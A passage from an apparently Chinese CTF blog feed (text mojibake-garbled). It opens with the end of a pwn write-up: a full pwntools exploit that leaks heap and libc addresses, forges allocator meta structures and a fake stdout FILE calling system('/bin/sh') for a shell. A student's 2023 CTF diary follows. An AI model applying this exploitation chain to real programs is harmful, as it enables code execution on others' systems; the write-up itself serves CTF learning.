class="string">&#x27;option: &#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> key_size <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        key_size = <span class="built_in">len</span>(key_content)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(key_size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content: &#x27;</span>, key_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_hash</span>(<span class="params">content</span>):</span><br><span class="line">    x = <span class="number">0x7e5</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> content:</span><br><span class="line">        x = <span class="built_in">ord</span>(c) + x * <span class="number">0x13377331</span></span><br><span class="line">    <span class="keyword">return</span> x &amp; <span class="number">0xfff</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_key</span>(<span class="params">length=<span class="number">0x10</span>, h=<span class="number">0x7e5</span></span>):  <span class="comment"># é»˜è®¤ä¸º\nå¯¹åº”çš„hash</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = <span class="string">&#x27;&#x27;</span>.join(random.choice(string.ascii_letters + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">        <span class="keyword">if</span> get_hash(x) == h:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;\n&#x27;</span>, <span class="string">b&#x27;B&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">store(find_key(), <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">store(<span class="string">b&#x27;A\n&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>, <span class="number">0x1200</span>)</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">res = codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">mmap_base = u64(res[:<span class="number">8</span>]) - <span class="number">0x20</span></span><br><span class="line">chunk_addr = u64(res[<span class="number">8</span>:<span class="number">0x10</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(chunk_addr - <span class="number">0x60</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">heap_base = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0x1d0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base + <span class="number">0xf0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x200</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">libc.address = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>]) - <span class="number">0xb7040</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\0&#x27;</span>))) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>] == <span class="string">b&#x27;/bin/sh\0&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(p64(<span class="number">0</span>) + p64(heap_base) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">query(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">secret = u64(codecs.decode(p.recvline(<span class="literal">False</span>).split(<span class="string">b&#x27;:&#x27;</span>)[<span class="number">1</span>], <span class="string">&#x27;hex&#x27;</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&#x27;mmap base: %#x&#x27;</span> % mmap_base)</span><br><span class="line">log.info(<span class="string">&#x27;chunk address: %#x&#x27;</span> % chunk_addr)</span><br><span class="line">log.info(<span class="string">&#x27;heap base: %#x&#x27;</span> % heap_base)</span><br><span class="line">log.info(<span class="string">&#x27;libc base: %#x&#x27;</span> % libc.address)</span><br><span class="line">log.info(<span class="string">&#x27;secret: %#x&#x27;</span> % secret)</span><br><span class="line"></span><br><span class="line">fake_meta_addr = mmap_base + <span class="number">0x2010</span></span><br><span class="line">fake_mem_addr = mmap_base + <span class="number">0x2040</span></span><br><span class="line">stdout = libc.address + <span class="number">0xb4280</span>  </span><br><span class="line">log.info(<span class="string">&#x27;fake_meta_addr: %#x&#x27;</span> % fake_meta_addr)</span><br><span class="line">log.info(<span class="string">&#x27;fake_mem_addr: %#x&#x27;</span> % fake_mem_addr)</span><br><span class="line">log.info(<span class="string">&#x27;stdout: %#x&#x27;</span> % stdout)</span><br><span class="line"></span><br><span class="line"><span class="comment"># é€šè¿‡dequeueçš„unlinkåœ¨stdout-0x10 çš„åœ°æ–¹å†™å…¥fake_meta_addr</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">freeable = <span class="number">1</span></span><br><span class="line">last_idx = <span class="number">0</span></span><br><span class="line">maplen = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x18</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr + <span class="number">0x30</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((maplen &lt;&lt; <span class="number">12</span>) | (sc &lt;&lt; <span class="number">6</span>) | (freeable &lt;&lt; <span class="number">5</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xaa0</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å°†è¯¥fake metaè¿›å…¥activeé˜Ÿåˆ—</span></span><br><span class="line">sc = <span class="number">8</span> <span class="comment"># 0x90</span></span><br><span class="line">last_idx = <span class="number">1</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(<span class="number">0</span>) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(fake_mem_addr) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">0</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">fake_mem = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_mem += p64(fake_meta_addr) <span class="comment"># meta</span></span><br><span class="line">fake_mem += p32(<span class="number">1</span>) <span class="comment"># active_idx</span></span><br><span class="line">fake_mem += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa90</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += fake_mem</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line">query(<span class="string">b&#x27;A&#x27;</span> * <span class="number">0x30</span>)</span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, p64(<span class="number">0</span>) + p64(fake_mem_addr + <span class="number">0x10</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>) + p64(<span class="number">0x7e5</span>) + p64(<span class="number">0</span>))</span><br><span class="line">delete(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¿®æ”¹metaçš„memåŒºåŸŸæŒ‡å‘stdout-0x10</span></span><br><span class="line">fake_meta = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># prev</span></span><br><span class="line">fake_meta += p64(fake_meta_addr) <span class="comment"># next</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>) <span class="comment"># mem</span></span><br><span class="line">fake_meta += p32(<span class="number">1</span>) + p32(<span class="number">0</span>) <span class="comment"># avail_mask, freed_mask</span></span><br><span class="line">fake_meta += p64((sc &lt;&lt; <span class="number">6</span>) | last_idx)</span><br><span class="line">fake_meta += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0x18</span></span><br><span class="line">fake_meta += p64(stdout - <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * <span class="number">0xa80</span></span><br><span class="line">payload += p64(secret) + p64(<span class="number">0</span>)</span><br><span class="line">payload += fake_meta</span><br><span class="line">payload += <span class="string">b&#x27;\n&#x27;</span></span><br><span class="line">query(payload, <span class="number">0x1200</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™å…¥fake file</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += <span class="string">b&quot;/bin/sh&quot;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># flags</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># rend</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># close</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wend</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wpos</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># mustbezero_1</span></span><br><span class="line">fake_file += p64(<span class="number">0x114514</span>)  <span class="comment"># wbase</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># read</span></span><br><span class="line">fake_file += p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># write</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0x80</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">store(<span class="string">b&#x27;A&#x27;</span>, fake_file, value_size=<span class="number">0x80</span>, wait=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a href="https://bbs.kanxue.com/thread-269533.htm">https://bbs.kanxue.com/thread-269533.htm</a><br><a href="https://www.anquanke.com/post/id/246929">https://www.anquanke.com/post/id/246929</a><br><a href="https://blog.csdn.net/qq_45323960/article/details/129800670">https://blog.csdn.net/qq_45323960&#x2F;article&#x2F;details&#x2F;129800670</a><br><a href="https://www.anquanke.com/post/id/241104#h2-3">https://www.anquanke.com/post/id/241104#h2-3</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023å°çç¢è®°å½•è´´</title>
      <link href="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/"/>
      <url>/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/</url>
      
        <content type="html"><![CDATA[<h2 id="2023-3-27"><a href="#2023-3-27" class="headerlink" title="2023&#x2F;3&#x2F;27"></a>2023&#x2F;3&#x2F;27</h2><p>åŠ å…¥<code>Sloth</code>å’¯ï¼ï¼ï¼<br>ä¸Šå­¦æœŸ<code>XSCTF</code>è”åˆæ‹›æ–°èµ›çˆ†<code>0</code>åå°±æ²¡æœ‰åœ¨<code>CTF</code>èµ°ä¸‹å»çš„æ‰“ç®—ï¼Œå¯æ˜¯å¯’å‡åœ¨æš¨å¤§çš„<code>i_corner</code>å¸ˆå‚…çš„é¼“åŠ±ä¸‹æ‰“ç®—å†åŠªåŠ›ä¸€æŠŠï¼Œåˆ·äº†<code>2</code>ä¸ªå¤šæœˆçš„<code>Crypto</code>å’Œ<code>misc</code>ï¼Œæœ€ååœ¨é€‰æ‹”èµ›æ‹¿äº†å…¨åœºä¸€è¡€(æˆ‘æœ€çˆ±çš„RSA)ï¼Œå¤ªæ„ŸåŠ¨äº†<code>QAQ</code><br>ä¸è¿‡ä¹Ÿæ„Ÿå—åˆ°äº†å·®è·ï¼Œç¬¬ä¸€åå’Œç¬¬äºŒåæ˜¯å¤§äºŒçš„å­¦é•¿ï¼Œåˆ†æ•°æ¯”æˆ‘é«˜å¥½å¤šï¼ŒåŒçº§çš„ä¹Ÿæœ‰ä¸€ä½é€†å‘å¥½å‰å®³<code>QAQ</code><br>æä¸€æï¼Œå•è½¦å˜æ‘©æ‰˜ï¼Œæˆ‘è¦è¶…è¶Šä»–ä»¬ï¼ï¼ï¼ï¼</p><h2 id="2023-4-2"><a href="#2023-4-2" class="headerlink" title="2023&#x2F;4&#x2F;2"></a>2023&#x2F;4&#x2F;2</h2><p>æ­£å¼å¼€å§‹å­¦<code>pwn</code>äº†æ  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="2023-5-28"><a href="#2023-5-28" class="headerlink" title="2023&#x2F;5&#x2F;28"></a>2023&#x2F;5&#x2F;28</h2><p>ç¬¬ä¸€æ¬¡æ‰“æ¯”èµ›ï¼Œç»™æ‰“çƒ‚äº†æ&gt;_&lt;<br>æ‰“äº†ä¸€ä¸ªæœˆçš„<code>ret2libc</code>,æ‰å‘ç°<code>pwn</code>åŸæ¥è¿˜æœ‰è¿™ä¹ˆå¤šä¸œè¥¿ï¼Œçœ‹æ¥è¦ç‹ ç‹ çš„å·äº†  </p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="2023-8-26"><a href="#2023-8-26" class="headerlink" title="2023&#x2F;8&#x2F;26"></a>2023&#x2F;8&#x2F;26</h2><p>å¥½è€¶ï¼Œé—­å…³ä¸€æ®µæ—¶é—´å†å‚åŠ æ¯”èµ›(è“å¸½æ¯)ï¼Œå‡ºäº†ä¸€é“å †é¢˜ï¼Œæˆå°±æ„Ÿæ‹‰æ»¡ï¼ï¼ï¼ï¼ï¼ï¼</p><h2 id="2023-9-10"><a href="#2023-9-10" class="headerlink" title="2023&#x2F;9&#x2F;10"></a>2023&#x2F;9&#x2F;10</h2><p>æ•°æ¨¡å›½èµ›é€†å¤§å¤©ï¼Œé¦–å…ˆæ˜¯æœ‰<code>78w</code>è¡Œæ•°æ®ï¼Œè„šæœ¬è·‘ä¸€æ¬¡å¥½å¥½å‡ åˆ†é’Ÿï¼Œå…¶æ¬¡æ˜¯é¢˜ç›®å®Œå…¨æ²¡æœ‰æ€è·¯ï¼Œæ‰¾ä¸åˆ°é€‚ç”¨çš„æ¨¡å‹<code>&gt;_&lt;</code>ï¼Œå®Œå…¨é é˜Ÿå‹å¸¦é£<code>Orz</code></p><h2 id="2023-10-15"><a href="#2023-10-15" class="headerlink" title="2023&#x2F;10&#x2F;15"></a>2023&#x2F;10&#x2F;15</h2><p>é¦™å±±æ¯å¤ªäºäº†ï¼Œå·®ä¸€ç‚¹ç‚¹(å‡ åˆ†)è¿›å†³èµ›ï¼Œé—®é¢˜å‡ºåœ¨<code>pwn</code>æ‰‹(æˆ‘),<code>pwn</code>å·®ä¸€é¢˜<code>Ak</code>ï¼Œå‰©ä¸‹ä¸€é¢˜<code>python pwn</code>ï¼Œæ¼æ´å‡ºç°åœ¨<code>python</code>ç¨‹åºè°ƒç”¨çš„å‡½æ•°åŒ…ï¼Œå‡½æ•°åŒ…ç”¨<code>C++</code>å†™çš„ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å’Œæ ˆæº¢å‡ºï¼Œå¯æ˜¯æˆ‘æœ¬åœ°å¯åŠ¨ä¸äº†ç¨‹åºï¼Œè°ƒè¯•ä¸äº†<code>QAQ</code>ï¼Œè¡€äºï¼Œæˆ‘èƒŒé”…ã€‚èµ›åå‘ç°è¦ä½¿ç”¨<code>python3.7</code>æ‰å¯ä»¥å¯åŠ¨ç¨‹åºï¼Œè£‚å¤§å¼€<br>åæœŸè¡¥å……ï¼šå†³èµ›<code>awdp</code>çš„<code>3</code>é¢˜<code>pwn</code>æˆ‘éƒ½ä¼šåšï¼Œæ²¡å»çº¿ä¸‹å¤ªå¯æƒœäº†ï¼Œå“¦å¯¹ï¼Œæˆ‘è¿˜æ²¡è¿›è¿‡çº¿ä¸‹(å‘å¾®)</p><h2 id="2023-10-16"><a href="#2023-10-16" class="headerlink" title="2023&#x2F;10&#x2F;16"></a>2023&#x2F;10&#x2F;16</h2><p>XSCTFè”åˆæ‹›æ–°èµ›ç»“æŸæ‹‰ï¼Œå˜¿å˜¿ï¼Œç¬¬ä¸€æ¬¡å‡ºé¢˜(ä¸€é“ç®€å•çš„libc-2.27çš„unlink)ï¼Œå±…ç„¶æ²¡äººåšï¼Ÿå®Œäº†ï¼Œè¦ç»™<code>JANlittle</code>æ‹‰å»å–‚é±¼äº†</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>pwnçš„è§£é¢˜æƒ…å†µæƒ¨ä¸å¿ç¹ï¼Œåˆ«åç»§æ— äººå•ŠQAQ(ä»¥åè°æ¥å¸¦æˆ‘)<br>133nsonå’ŒCsomeå¸ˆå…„å‡ºçš„<code>pwn</code>é¢˜è´¨é‡æ˜¯çœŸçš„é«˜ï¼Œæˆ‘è¦å¥½å¥½å­¦ä¹ </p><h2 id="2023-11-9"><a href="#2023-11-9" class="headerlink" title="2023&#x2F;11&#x2F;9"></a>2023&#x2F;11&#x2F;9</h2><p>å˜¿å˜¿ï¼Œ<code>CS</code>æ¯é€‰æ‹”èµ›ï¼Œæ¬ºè´Ÿè€å®äºº<br>è°è¯´ç®—æ³•åªèƒ½ç”¨<code>C/C++</code>æ‰“çš„ï¼Œä¸Š<code>python</code>ï¼ï¼ï¼ï¼ï¼<br>4é“é¢˜15åˆ†é’Ÿå¹²äº†3é¢˜ï¼Œè€Œä¸”2é¢˜ä¸€è¡€ï¼Œä¸è¿‡æœ€åä¸€é¢˜ç”¨æ·±æœè¶…æ—¶ï¼Œåˆ°æœ€åéƒ½æ²¡æœ‰åšå‡ºæ¥ï¼Œå“ï¼Œç®—æ³•å¤ªçƒ‚äº†ï¼Œè€Œä¸”å¥½ä¹…æ²¡çœ‹äº†ï¼Œäººèœç˜¾å¤§xD</p><h2 id="2023-12-9"><a href="#2023-12-9" class="headerlink" title="2023&#x2F;12&#x2F;9"></a>2023&#x2F;12&#x2F;9</h2><p>PolarCTFæ‰“çˆ½äº† Solved:24 grade:7000 rank:3<br>11é¢˜pwnå…¨éƒ½ä¼š(æœ‰ä¸€é¢˜<code>house of orange</code>å«Œéº»çƒ¦ä¸”åˆ†ä¸é«˜æ²¡æ‰“ï¼Œç»“æœç»™<code>jelasin</code>å¸ˆå‚…éª‚äº†<code>QAQ</code>)ï¼Œè¿˜æ‹¿äº†é¢˜å”¯ä¸€è¡€(é¢„æœŸè§£ä¸ºæ”¹<code>printf</code>çš„æ ¼å¼è¡¨ï¼Ÿä¸å­˜åœ¨çš„ï¼Œæ‰“<code>IO</code>æ‰æ˜¯<code>yyds</code>ï¼ï¼ï¼)<br>Cryptoå…¨æ˜¯è„‘æ´é¢˜ï¼Œæ²¡æœ‰æ•°å­¦é¢˜ï¼Œå·®è¯„QAQï¼Œåªä¼šæ•°å­¦é¢˜&gt;_&lt;<br>æœ‰é¢˜é€†å‘åšå‡ºæ¥åæ€ä¹ˆäº¤éƒ½æ˜¯é”™ï¼Œç»“æŸåæ‰å‘ç°<code>flag</code>è¦è¿›è¡Œ<code>md5</code>åŠ å¯†ï¼Œé€†å¤©(è²Œä¼¼é¢˜ç›®ä¸Šä¹Ÿæ²¡æœ‰è¯´æ˜XD)</p><h2 id="2023-12-10"><a href="#2023-12-10" class="headerlink" title="2023&#x2F;12&#x2F;10"></a>2023&#x2F;12&#x2F;10</h2><p>ç»™<code>Csome</code>å¸ˆå…„æ‹‰å»<code>S1uM4i</code>æ‰“<code>TCTF/0CTF</code>,åå¤§ç‰¢ï¼ï¼ï¼é¢˜ç›®è¿‡äºé€†å¤©ï¼Œè¿ä»€ä¹ˆ<code>ios kernel</code>éƒ½æ¥äº†ï¼Œæ„Ÿè§‰æœ€å°‘è¿˜è¦å†ç»ƒä¸€å¹´æ‰èƒ½åœ¨è¿™ä¸ªæ¯”èµ›ä¸Šåšå‡ºé¢˜ã€‚<br>æ‰å¤§äºŒï¼Œè¿˜æ¥å¾—åŠï¼Œå†²ï¼ï¼ï¼ï¼</p><h2 id="2023-12-17"><a href="#2023-12-17" class="headerlink" title="2023&#x2F;12&#x2F;17"></a>2023&#x2F;12&#x2F;17</h2><p>å¼ºç½‘æ¯å¤ªé€†å¤©äº†å•Šï¼Œå­¦ä¼šäº†å„ç§<code>io file</code>æ”»å‡»ä»¥ä¸ºå¯ä»¥ä¹±æ€ï¼Œç»“æœå‘ç°é¢˜ç›®éƒ½æ˜¯<code>VM</code>ç±»å‹ï¼Œå®Œå…¨çœ‹ä¸æ‡‚é€†å‘ï¼Œçœ‹æ¥<code>kernel</code>è¦å»¶åä¸€æ®µæ—¶é—´å†å­¦äº†ï¼Œå…ˆæŠŠ<code>vmpwn</code>ç»™æ‹¿ä¸‹<br>æ¯”èµ›æœ‰ç‚¹å¯æƒœï¼Œå·®ä¸€ç‚¹è¿›å†³èµ›<code>QAQ</code>ï¼Œå½’æ ¹åˆ°åº•æ˜¯æˆ‘çš„é—®é¢˜ï¼Œé˜Ÿå‹å¾ˆ<code>c</code>äº†ï¼Œè¦æ˜¯æˆ‘èƒ½æŠŠé‚£ä¸¤é¢˜ç®€å•<code>pwn</code>åšå‡ºæ¥å°±èƒ½è¿›å†³èµ›äº†(<code>WTOA</code>å’Œ<code>A-rtsp</code> éƒ½æ˜¯çœ‹ä¸æ‡‚é€†å‘ï¼Œæˆ‘çš„<code>500</code>åˆ†é¸­<code>QAQ</code>)ï¼Œå¯’å‡ç»™æˆ‘ç‹ ç‹ å·ï¼ï¼ï¼ï¼ å¤‡æˆ˜æœŸæœ«ï¼Œè¿™å­¦æœŸç»©ç‚¹å¿…é¡»ç»™æˆ‘é«˜é«˜é«˜ï¼ï¼ï¼ï¼</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è™½ç„¶å¾ˆé—æ†¾ï¼Œä¸è¿‡ä¹Ÿå­¦åˆ°äº†æ€ä¹ˆé€šè¿‡<code>puts</code>å‡½æ•°æ¥è°ƒç”¨<code>io</code>é“¾ï¼Œä¹Ÿç®—æ˜¯ä¸€ç§æ‰€è·å§ï¼Œå¼ºç½‘æ¯å·²ç»æ²¡æœ‰æƒ³è¿›å†³èµ›çš„æ¬²æœ›äº†ï¼Œå¤ªå·äº†<br>æ„Ÿè§‰<code>AFL fuzz</code>æŠ€æœ¯ä¹Ÿè¦å­¦å­¦ï¼Œåœ¨å¾ˆå¤šé¢˜ç›®ä¸Šéƒ½èƒ½ç”¨åˆ°</p><h2 id="2023-12-28"><a href="#2023-12-28" class="headerlink" title="2023&#x2F;12&#x2F;28"></a>2023&#x2F;12&#x2F;28</h2><p>å¥½å¥½å¥½ï¼Œä¸Šå¤§å­¦ä¸€å¹´å¤šï¼Œå·²ç»å˜æˆ<code>IT</code>çš„å½¢çŠ¶äº†</p><img src="/2023/12/27/2023%E5%B0%8F%E7%90%90%E7%A2%8E%E8%AE%B0%E5%BD%95%E8%B4%B4/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <p>è€ƒå®Œ<code>java</code>æ”¾æ¾çš„æ—¶å€™ç¿»äº†ä¸€ä¸‹ä¸Šå­¦æœŸæ ¡é˜Ÿé€çš„<code>ã€ŠCTFæƒå¨æŒ‡å— pwnç¯‡ã€‹</code>,å‘ç°é‡Œé¢çš„å†…å®¹ç¡®å®åŸºç¡€å’Œç®€å•ï¼Œä¸è¿‡å½“æ—¶ä¹°å›æ¥çœ‹çš„æ—¶å€™æ„Ÿè§‰åœ¨çœ‹å¤©ä¹¦ï¼ŒçœŸå±äºæ˜¯ä¸ä¼šæ—¶çœ‹å¤©ä¹¦ï¼Œä¼šæ—¶ç”¨ä¸ä¸Šäº†<br>é‡Œé¢çš„å¾ˆå¤šå 